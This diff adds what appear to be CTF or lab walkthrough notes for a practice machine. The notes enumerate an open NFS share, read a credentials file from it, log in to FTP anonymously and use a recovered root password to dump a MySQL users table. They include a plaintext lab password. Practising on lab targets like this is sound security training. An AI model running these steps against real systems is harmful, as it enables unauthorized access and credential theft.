@@ -1,0 +1,18 @@
+1) nmap IP
+2) sudo showmount -e IP
+3) mkdir nfs
+4) sudo mount IP:/opt/files /path/to/nfs
+5) cat /nfs/creds.txt 
+this gives you the password
+6) ftp IP, login with username "anonymous" and password ""
+7) ls
+8) get file.txt /home/kali/desktop/flag.txt
+9) cat flag.txt to get password for mysql
+root
+ff912ABD*
+10) mysql -h IP -u USERNAME -p PASSWORD
+11) show databases;
+12) select * from data;
+13) show tables;
+14) select * from USERS;
+15) you have the password and username
